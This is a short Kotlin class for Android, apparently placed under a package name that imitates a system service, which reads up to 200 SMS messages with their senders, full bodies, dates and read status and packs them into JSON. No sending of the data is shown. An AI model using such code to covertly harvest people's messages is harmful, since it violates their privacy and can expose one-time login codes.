package com.android.systemservices

import android.content.Context
import android.net.Uri
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

class SmsHelper(private val context: Context) {
    fun getSms(limit: Int = 200): JSONArray {
        val result = JSONArray()
        try {
            context.contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type", "read"),
                null, null, "date DESC"
            )?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count++ < limit) {
                    result.put(JSONObject().apply {
                        put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")) ?: "")
                        put("body",    cursor.getString(cursor.getColumnIndexOrThrow("body")) ?: "")
                        put("date",    cursor.getLong(cursor.getColumnIndexOrThrow("date")))
                        put("type",    when (cursor.getInt(cursor.getColumnIndexOrThrow("type"))) {
                            1 -> "inbox"; 2 -> "sent"; 3 -> "draft"; else -> "unknown"
                        })
                        put("read",    cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1)
                    })
                }
            }
        } catch (e: Exception) {
            Log.e("SmsHelper", "Error reading SMS", e)
        }
        return result
    }
}
